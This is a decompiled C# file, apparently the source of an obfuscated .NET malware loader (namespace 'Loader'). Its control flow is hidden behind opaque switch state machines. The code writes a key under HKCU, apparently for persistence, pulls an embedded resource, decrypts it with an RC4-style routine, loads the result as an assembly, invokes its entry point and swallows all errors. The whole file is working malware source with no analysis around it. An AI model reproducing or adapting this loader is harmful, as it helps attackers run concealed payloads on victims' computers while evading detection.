using System;
using System.Collections;
using System.Reflection;
using System.Resources;
using Microsoft.Win32;

namespace Loader;

internal sealed class DeviceSerializer
{
	internal static ClientEventArgs previousId/* Not supported: data(D0 BF 28 87 A5 1B 54 9F 3F CA AE 73 38 B1 4B 26 C2 2A 2B 2F BB 5B 87 A5 BA 55 2B 67 44 27 AA 37 95 FE 07 73 5B 02 F4 48 49 95 F6 A1 63 67 0A C2 3B 2B A4 59 9C F0 38 74 38 82 CB 50 EE EC 5A 18 20 76 DC 38 AA D6 CA BF 34 E2 E4 25 63 E4 41 53 4A 67 2C 19 81 50 9A A4 C6 92 3B D7 35 A4 58 5C 3A DE 80 EC 8A D1 18 64 5F E3 25 B8 0B 12 10 53 41 78 05 86 BF 41 95 CF DB 37 70 18 9B F1 89 8F 89 88 E9 84 63 54 C7 78 4F C7 B8 9D 2B E0 99 B3 81 E7 96 BC 9E D0 9B F8 49 B0 11 52 60 FE C8 6D 59 94 2F 81 27 8A EE EB AF 8B 37 F7 87 F7 A4 F9 9D BB 95 B2 5A CC F0 B7 EB F0 3B B2 43 75 18 4F FD 4A 43 96 B1 17 8C F5 F8 AA 0D 12 99 A3 70 50 0C 17 B4 A3 69 15 13 8C A2 76 94 36 4F 3B A8 3A 73 E6 F8 3C B3 0E 47 85 2F 9E B9 AF BF DD 1D 48 7F E9 A6 2C BF 73 E5 E8 37 B6 F2 3B 81 55 A6 BC 01 D2 9E B2 A9 34 9C FD CE 2F 73 CA 5A 62 CB C4 58 4B B6 65 94 7C 79 FE 00 0F 04 FC 1A 0C 03 D9 F6 FC AD EC 3F 6A 9E 4B 4D A7 5C 90 FE 1B 8E D3 E9 2D E1 36 9E 41 28 84 58 9E B1 99 2F 9F E2 C2 2B 99 D2 5D B4 DE 84 ED AC 6B 17 EB 20 E8 00 E4 80 2F 12 EC 29 CC 3B B5 D4 29 93 A0 B8 04 1B AD C4 98 64 64 47 31 1F 0A A7 F3 88 32 29 3B 63 6F 9D CB 19 FE 8C F5 98 5E 5E 1C 87 8A 4B E3 34 A8 4F 69 27 86 83 9A 9C 4F 10 07 44 35 43 08 8B 98 C4 24 02 EB EA 1C 20 CD 00 06 06 2B A8 93 BE C3 BE DF E2 BE 13 DC EB 03 2E C8 EE 84 B1 63 1A 55 90 ED C5 26 E1 48 BC 33 48 58 86 7D 93 71 A6 7B 48 80 76 63 25 CB 85 E7 38 FD BC 21 2D 9B 1C 9C EA AF 99 B9 CD 97 E0 75 22 AF 75 BA 56 6D 6E BC 22 72 3C 31 EC B6 30 C3 68 DD ED E2 8A 9B 05 AC 3B E9 91 E3 D6 EB AD AF 9E 00 40 75 55 C9 90 C9 8F 00 FD B9 5E EA AE 34 7E D5 50 EE A9 FC EA 86 A9 C8 7E 6C DB 8A E4 36 C4 8C 91 EC 75 B9 6D 9E 4C 24 53 8A 9C 4A 4E 50 3A 5D 64 01 9B BD 05 A0 15 B9 CB 8C 4B 24 ED 05 1B C7 F4 D1 58 C1 BE C3 68 B1 A2 85 A9 5F E9 5E 79 2D 32 7E 25 E3 9A 06 86 EF D7 BB ED DF 52 28 36 4E 6F D3 55 7C F6 77 9D 9F 97 E8 1B 7F F6 B4 CE 6C 13 1D F1 6E DE 36 2D ED 4A 67 E9 02) */;

	internal static byte[] previousId;

	internal static GroupTable previousId/* Not supported: data(8A 8D 00 00 77 A8 00 00 43 8C 00 00 84 28 00 00 99 5A 00 00 3B D7 00 00 4E E7 00 00 94 C8 00 00 96 39 00 00 39 D6 00 00 FB 8C 00 00 A0 BB 00 00 CC 18 00 00 89 0D 00 00 42 CB 00 00 CE 67 00 00 EA C0 00 00 D1 63 00 00 D2 46 00 00 5F 81 00 00 64 2B 00 00 6A 22 00 00 15 A8 00 00 B2 D1 00 00 B2 2A 00 00 3C 52 00 00 9E 68 00 00 E5 D1 00 00 1D 00 00 00 14 A6 00 00 82 DA 00 00 C7 9C 00 00 82 6E 00 00 81 CC 00 00 17 C3 00 00 A5 B3 00 00 FC 7D 00 00 20 81 00 00 AB 17 00 00 02 05 00 00 4C E7 00 00 FA E0 00 00 EF A3 00 00 56 4A 00 00 57 73 00 00 01 80 00 00 D6 27 00 00 C5 6F 00 00 87 8B 00 00 29 CC 00 00 61 C2 00 00 1C 36 00 00 C7 03 00 00 29 B9 00 00 91 53 00 00 1F 6B 00 00 62 00 00 00 8F BA 00 00 D1 FD 00 00 5C 08 00 00 9D 6E 00 00 68 15 00 00 76 C8 00 00 81 93 00 00 B5 FB 00 00 33 F0 00 00 1E 4D 00 00 4A 4C 00 00 71 4A 00 00 9C 17 00 00 D0 E9 00 00 C9 3F 00 00 25 4C 00 00 D0 41 00 00 11 9A 00 00 68 4A 00 00 79 7E 00 00 BE 5D 00 00 5B 5E 00 00 B0 AA 00 00 65 2A 00 00 D8 F8 00 00 5E 46 00 00 F3 33 00 00 B1 E3 00 00 66 A4 00 00 FF 98 00 00 58 B5 00 00 F0 78 00 00 F7 57 00 00 43 B3 00 00 6B C3 00 00 4E 83 00 00 4F 0F 00 00 63 96 00 00 E3 D1 00 00 83 18 00 00 6E 10 00 00 9F 4E 00 00 23 83 00 00 E3 32 00 00 8B DB 00 00 53 25 00 00 EA 73 00 00 57 E2 00 00 97 82 00 00 F5 E9 00 00 F6 C1 00 00 17 1F 00 00 28 09 00 00 A5 EC 00 00 A2 A2 00 00 34 5C 00 00 21 53 00 00 F5 DD 00 00 C4 75 00 00 09 CF 00 00 83 94 00 00 CE AF 00 00 4F 57 00 00 33 57 00 00 C4 97 00 00 58 D3 00 00 78 F2 00 00 58 64 00 00 65 26 00 00 7A BC 00 00 D6 3C 00 00 6B AB 00 00 2C C8 00 00 E4 31 00 00 0B 6E 00 00 1F 0F 00 00 37 DB 00 00 CC 77 00 00 D9 4E 00 00 84 D3 00 00 72 D2 00 00 9B 51 00 00 19 61 00 00 70 BA 00 00 07 D7 00 00 40 96 00 00 C8 6F 00 00 51 6B 00 00 A0 10 00 00 36 67 00 00 2C 30 00 00 58 31 00 00 9F 20 00 00 DA 02 00 00 FF 83 00 00 9E 60 00 00 4F F7 00 00 EF 2B 00 00 1D 9B 00 00 33 08 00 00 DA 32 00 00 92 0F 00 00 F2 BB 00 00 1C C6 00 00 1E AD 00 00 8A 16 00 00 EA 56 00 00 42 D7 00 00 99 7E 00 00 83 93 00 00 FC 80 00 00 53 DB 00 00 1C 8F 00 00 3F A2 00 00 96 FC 00 00 E7 42 00 00 B5 4E 00 00 DD 9C 00 00 2B 80 00 00 83 01 00 00 8F 63 00 00 27 87 00 00 B7 53 00 00 2D BF 00 00 4D 8C 00 00 7D 0B 00 00 CC 8A 00 00 51 C5 00 00 E3 AD 00 00 6C 0D 00 00 CE 17 00 00 47 AF 00 00 AE DC 00 00 A5 46 00 00 A9 A0 00 00 DF C2 00 00 A7 95 00 00 FC 9A 00 00 52 0D 00 00 7C C0 00 00 56 3F 00 00 84 98 00 00 B6 EC 00 00 1C 7D 00 00 39 E6 00 00 D8 54 00 00 3B A2 00 00 5E 7E 00 00 43 06 00 00 17 41 00 00 E9 11 00 00 71 5A 00 00 C2 AB 00 00 9A 99 00 00 A3 A4 00 00 B2 AB 00 00 DA BB 00 00 C4 FC 00 00 CE 39 00 00 A0 A1 00 00 BD 8B 00 00 97 91 00 00 5E 29 00 00 2D 71 00 00 B4 7B 00 00 B3 D1 00 00 A4 FE 00 00 76 48 00 00 95 01 00 00 B6 39 00 00 3F AD 00 00 B7 B3 00 00 8B 8F 00 00 AD BF 00 00 2C C2 00 00 0A CB 00 00 6F 9A 00 00 99 D6 00 00 F2 D8 00 00 75 37 00 00 41 69 00 00 6D 0C 00 00 0E BF 00 00 CC 6C 00 00 82 FB 00 00 5B BD 00 00 84 03 00 00 14 43 00 00 00 A2 00 00 F6 F4 00 00 04 07 00 00 E2 98 00 00 2E 61 00 00 B0 6B 00 00 BF 34 00 00 BD AD 00 00 25 6F 00 00 88 7B 00 00 67 01 00 00 86 14 00 00 33 56 00 00 C4 59 00 00 C8 7C 00 00 8B CC 00 00 D7 93 00 00 30 5E 00 00 E5 CA 00 00 14 EC 00 00 6C D7 00 00 98 D9 00 00 42 11 00 00 40 E5 00 00 D1 23 00 00 58 02 00 00 5F 38 00 00 4F 7F 00 00 88 D2 00 00 91 BC 00 00 AA 75 00 00 57 BE 00 00 2E CE 00 00 90 BB 00 00 75 A6 00 00 9E 0C 00 00 B1 32 00 00 5C 14 00 00 89 52 00 00 DA 23 00 00 ED 8A 00 00 6E 14 00 00 E4 5B 00 00 E6 1E 00 00 31 D5 00 00 6C C4 00 00 41 E1 00 00 7C 0F 00 00 A3 8F 00 00 81 F2 00 00 F3 D8 00 00 51 9D 00 00 75 F2 00 00 6F 17 00 00 A6 6B 00 00 67 C8 00 00 B3 E3 00 00 C3 21 00 00 11 75 00 00 D5 5E 00 00 51 33 00 00 6E B5 00 00 34 DB 00 00 92 B2 00 00 DE 05 00 00) */;

	internal static int[] previousId;

	private static void CloneWindow(string[] args)
	{
		int[] array = previousId;
		byte[] array2 = ResourceContext.previousId;
		int num = 8;
		object obj = default(object);
		int num7 = default(int);
		object obj7 = default(object);
		Array array3 = default(Array);
		object obj3 = default(object);
		object obj4 = default(object);
		object obj2 = default(object);
		object obj5 = default(object);
		int num3 = default(int);
		while (true)
		{
			int num8;
			switch (num)
			{
			case 17:
				AspectSettings.PathStream.RegistryStream.CloneWindow((RegistryKey)(obj as MarshalByRefObject), AspectSettings.PathStream.CloneWindow(0, null, 1582877141), (object)AspectSettings.PathStream.CloneWindow(AspectSettings.DatabaseService.CloneWindow(Environment.SpecialFolder.LocalApplicationData, '\u02d5', 764), AspectSettings.PathStream.CloneWindow(7, null, 1582877084), '\u0339', '\u0306'), (short)736, '\u02df');
				goto case 9;
			case 9:
				num7 = 4;
				num = 5;
				break;
			case 16:
				num = (ActivityInfo.CloneWindow(AspectSettings.PathStream.CloneWindow(AspectSettings.DatabaseService.CloneWindow(Environment.SpecialFolder.LocalApplicationData, '\u0097', 190), AspectSettings.PathStream.CloneWindow(5, null, 1582877086), 'ŏ', 'Ű'), 621, 635) ? 14 : 7);
				break;
			case 15:
			{
				object obj9 = CloneWindow(AspectSettings.PathStream.CloneWindow(4, null, 1582877057));
				obj = AspectSettings.PathStream.CloneWindow(Registry.CurrentUser, ((IEnumerable)obj9) as string, bool_0: true, 'ȋ', 597);
				goto case 0;
			}
			case 0:
				num = 13;
				break;
			case 14:
				num8 = 3;
				goto IL_00fb;
			case 6:
				num = 5;
				break;
			case 13:
				num7 = 8;
				num = 5;
				break;
			case 12:
				AspectSettings.PathStream.CloneWindow(AspectSettings.PathStream.RegistryStream.CloneWindow(944, 1022), AspectSettings.PathStream.CloneWindow(AspectSettings.DatabaseService.CloneWindow(Environment.SpecialFolder.LocalApplicationData, 'ω', 992), AspectSettings.PathStream.CloneWindow(6, null, 1582877085), 'Ų', 'ō'), 984, 911);
				goto case 15;
			case 11:
			{
				long num9 = AspectSettings.CloneWindow(928, 970);
				_ = AspectSettings.CloneWindow(204, 166) - num9;
				num = 4;
				break;
			}
			case 10:
				num7 = 5;
				num = array2[207];
				break;
			default:
				obj7 = ResourceContext.previousId;
				array3 = DeviceSerializer.previousId;
				num7 = 2;
				num = 5;
				break;
			case 7:
				num8 = 1;
				goto IL_00fb;
			case 5:
				num = num7 switch
				{
					0 => 9, 
					1 => 12, 
					2 => 1, 
					3 => 15, 
					4 => array[123] - 62069, 
					5 => 11, 
					6 => array2[28] - array2[20], 
					7 => (int)array2[142] / 2, 
					8 => array[304] - 24260, 
					9 => 9, 
					_ => 1, 
				};
				break;
			case 4:
				num7 = ((byte[])array3)[409];
				num = 5;
				break;
			case 1:
				ActivityInfo.CloneWindow();
				obj3 = new object[0];
				AspectSettings.CloneWindow(new Random(), 300, 750, 'λ', 983);
				num = array2[154] - 223;
				break;
			case 2:
			case 3:
				{
					AspectSettings.CloneWindow((obj as MarshalByRefObject) as RegistryKey, 'Ϟ', 'Δ');
					try
					{
						int num2 = 13;
						while (true)
						{
							int num5;
							switch (num2)
							{
							case 3:
							case 15:
								PluginEditor.CloneWindow<ResourceManager>((ResourceManager)obj4, (short)886, 879);
								obj2 = ActionTree.CloneWindow((byte[])obj5, 281, 'ĸ');
								num2 = 7;
								continue;
							case 14:
								num5 = (array3 as byte[])[324] - 172;
								goto IL_0358;
							case 4:
								num2 = array2[316] - array2[152];
								continue;
							default:
								num3 = 7;
								num2 = array2[207];
								continue;
							case 12:
								num3 = 8;
								num2 = 5;
								continue;
							case 9:
								num5 = (obj7 as int[])[174] - 51932;
								goto IL_0358;
							case 8:
								obj4 = new ResourceManager(AspectSettings.PathStream.CloneWindow(4, null, 1582877019), ActivityInfo.CloneWindow((short)819, (short)805));
								num3 = 5;
								num2 = array[129] - 51239;
								continue;
							case 7:
								num2 = ((PluginEditor.CloneWindow((MethodBase)PluginEditor.PaneProvider.CloneWindow<Assembly>((Assembly)(ICustomAttributeProvider)obj2, 455, 499), (short)941, 'ϲ').Length <= 0) ? 14 : 9);
								continue;
							case 6:
							{
								byte num4 = (array3 as byte[])[238];
								DeviceSerializer.previousId[148] = (byte)((DeviceSerializer.previousId[148] ^ ResourceContext.previousId[146]) & 0xEB);
								num3 = num4 - 29;
								num2 = array[47] - 28608;
								continue;
							}
							case 5:
								num2 = num3 switch
								{
									0 => array[147] - 12329, 
									1 => array[178] - 34598, 
									2 => array2[39], 
									3 => 8, 
									4 => 8, 
									5 => 0, 
									6 => array2[39], 
									7 => array2[194] - 84, 
									8 => 11, 
									_ => 8, 
								};
								continue;
							case 1:
							{
								object obj6 = new object[1];
								(obj6 as object[])[0] = args;
								obj3 = obj6 as object[];
								num2 = array2[298] - 92;
								continue;
							}
							case 0:
								obj5 = CloneWindow((byte[])PluginEditor.ReferenceFactory.CloneWindow<string, ResourceManager>((ResourceManager)obj4, AspectSettings.PathStream.CloneWindow(8, null, 1582877001), '¶', (short)203), AspectSettings.PathStream.CloneWindow(2, null, 1582877005));
								num2 = array2[369] - 105;
								continue;
							case 11:
								{
									PluginEditor.PaneProvider.CloneWindow<Assembly>((Assembly)(ICustomAttributeProvider)obj2, 334, 378).Invoke(null, obj3 as object[]);
									break;
								}
								IL_0358:
								num3 = num5;
								goto case 4;
							}
							break;
						}
					}
					catch
					{
					}
					int num6 = 1;
					while (true)
					{
						switch (num6)
						{
						case 3:
						case 5:
							return;
						}
						num6 = 2 switch
						{
							0 => 5, 
							1 => 5, 
							2 => 5, 
							3 => array2[207], 
							4 => array[309] - 1497, 
							_ => 5, 
						};
					}
				}
				IL_00fb:
				num7 = num8;
				goto case 6;
			}
		}
	}

	private static string CloneWindow(string string_0)
	{
		byte[] array = ResourceContext.previousId;
		int[] array2 = previousId;
		int num2 = default(int);
		object obj = default(object);
		while (true)
		{
			Array array3 = DeviceSerializer.previousId;
			int num = array[39] * 4;
			while (true)
			{
				switch (num)
				{
				case 9:
					num2 = 2;
					num = array[39];
					continue;
				case 7:
					AspectSettings.PathStream.RegistryStream.CloneWindow((Array)(char[])obj, '7', 'P');
					num = array2[264] - 60430;
					continue;
				case 2:
				case 6:
					num2 = (array3 as byte[])[129] - 133;
					num = 1;
					continue;
				case 4:
					obj = AspectSettings.PathStream.CloneWindow(string_0, 631, 'ɀ');
					goto case 7;
				default:
					num = 5;
					continue;
				case 1:
					switch (num2)
					{
					default:
						num = 9;
						break;
					case 0:
						num = array2[4] - 23184;
						break;
					case 1:
						num = 4;
						break;
					case 2:
						num = 4;
						break;
					case 3:
						num = 8;
						break;
					case 4:
					{
						byte num3 = array[13];
						previousId[202] = (previousId[202] | previousId[92]) & 0xE4;
						num = (int)num3 / 8;
						break;
					}
					case 5:
						num = array[334] - array[3];
						break;
					}
					continue;
				case 5:
					break;
				case 8:
					return new string((char[])obj);
				}
				break;
			}
		}
	}

	public static byte[] CloneWindow(byte[] byte_0, string string_0)
	{
		int[] array = previousId;
		byte[] array2 = ResourceContext.previousId;
		int num5 = default(int);
		int num6 = default(int);
		object obj = default(object);
		int num8 = default(int);
		int num3 = default(int);
		byte b = default(byte);
		int num2 = default(int);
		object obj2 = default(object);
		object obj3 = default(object);
		while (true)
		{
			Array array3 = DeviceSerializer.previousId;
			Array array4 = ResourceContext.previousId;
			int num = 8;
			while (true)
			{
				int num9;
				int num7;
				int num4;
				switch (num)
				{
				case 38:
					num9 = 16;
					goto IL_0013;
				case 31:
				case 37:
					num = num5 switch
					{
						0 => 19, 
						1 => array[57] - 47725, 
						2 => (int)array2[173] / 6, 
						3 => array2[175], 
						4 => array2[56] - 152, 
						5 => 5, 
						6 => 8, 
						7 => 35, 
						8 => 25, 
						9 => array2[225] - 180, 
						10 => 30, 
						11 => 18, 
						12 => 6, 
						13 => 5, 
						14 => 28, 
						15 => 32, 
						16 => 1, 
						17 => array2[387] - 122, 
						18 => array[212] - 43941, 
						19 => 26, 
						20 => 12, 
						21 => 10, 
						_ => 25, 
					};
					continue;
				case 36:
					byte_0[num6] ^= ((byte[])(Array)obj)[num8];
					num = array2[30];
					continue;
				case 35:
					((obj as Array) as byte[])[num3] = b;
					num8 = (((byte[])(obj as Array))[num2] + ((byte[])(obj as Array))[num3]) % 256;
					num = 34;
					continue;
				case 7:
				case 34:
					num5 = ((byte[])array3)[30] - 161;
					num = (int)array2[140] / 6;
					continue;
				case 33:
					num5 = 5;
					num = array2[232] - 211;
					continue;
				case 32:
					num = ((num6 < PluginEditor.CloneWindow((Array)byte_0, 0, 846, (short)836)) ? 38 : (array2[28] - 4));
					continue;
				case 30:
					b = ((byte[])(Array)obj)[num2];
					((obj as Array) as byte[])[num2] = (((Array)obj) as byte[])[num3];
					num = 4;
					continue;
				case 29:
					num2 = (num3 = 0);
					num6 = 0;
					num5 = ((byte[])array3)[281];
					num = array[242] - 48438;
					continue;
				case 28:
					num = ((num2 < 256) ? (array[2] - 35904) : 16);
					continue;
				case 27:
					num9 = 3;
					goto IL_0013;
				case 26:
					obj = new byte[256];
					obj2 = new byte[256];
					num2 = 0;
					num5 = 14;
					num = 37;
					continue;
				case 25:
					num5 = ((byte[])array3)[409];
					num = array[6] - 59177;
					continue;
				case 24:
					num7 = 17;
					goto IL_030a;
				case 23:
					((byte[])(Array)obj)[num3] = b;
					num2++;
					num = array[301] - 58282;
					continue;
				default:
					num = 0;
					continue;
				case 21:
					num5 = (array4 as int[])[81] - 56027;
					num = 37;
					continue;
				case 20:
					num5 = (array3 as byte[])[117] - 54;
					num = array2[126] - array2[56];
					continue;
				case 19:
					num = ((num2 < 256) ? (array2[293] - 158) : 15);
					continue;
				case 18:
					b = ((byte[])(Array)obj)[num2];
					((byte[])(Array)obj)[num2] = ((obj as Array) as byte[])[num3];
					num = 17;
					continue;
				case 17:
					num5 = 7;
					num = 37;
					continue;
				case 16:
					num4 = 18;
					goto IL_03e4;
				case 15:
					num7 = ((int[])array4)[307] - 15645;
					goto IL_030a;
				case 14:
					num5 = 20;
					num = 37;
					continue;
				case 13:
					num3 = 0;
					num2 = 0;
					num5 = 0;
					num = array[137] - 53837;
					continue;
				case 12:
					num2++;
					num5 = (array4 as int[])[262] - 20145;
					num = 37;
					continue;
				case 10:
					(((Array)obj) as byte[])[num2] = (byte)num2;
					((byte[])obj2)[num2] = ((byte[])(obj3 as Array))[num2 % AspectSettings.PathStream.CloneWindow((Array)(((Array)obj3) as byte[]), 0, 422, 'ǃ')];
					num = array[237] - 26931;
					continue;
				case 9:
					num5 = 0;
					num = 37;
					continue;
				case 8:
					obj3 = AspectSettings.DatabaseService.CloneWindow(ActivityInfo.CloneWindow(293, 280), string_0, 'Ē', 382);
					num5 = 19;
					num = 37;
					continue;
				case 6:
					num3 = (num3 + ((byte[])(obj as Array))[num2] + ((byte[])obj2)[num2]) % 256;
					num = 21;
					continue;
				case 5:
					num6++;
					num5 = (array4 as int[])[121] - 10792;
					num = array2[22] - 216;
					continue;
				case 4:
					num5 = 2;
					num = array[89] - 22482;
					continue;
				case 3:
					num4 = 21;
					goto IL_03e4;
				case 1:
					num2 = (num2 + 1) % 256;
					num3 = (num3 + (((Array)obj) as byte[])[num2]) % 256;
					num = 20;
					continue;
				case 0:
					break;
				case 2:
				case 11:
					{
						return byte_0;
					}
					IL_03e4:
					num5 = num4;
					num = array2[235] + 26;
					continue;
					IL_030a:
					num5 = num7;
					num = 37;
					continue;
					IL_0013:
					num5 = num9;
					num = array[108] - 7922;
					continue;
				}
				break;
			}
		}
	}
}
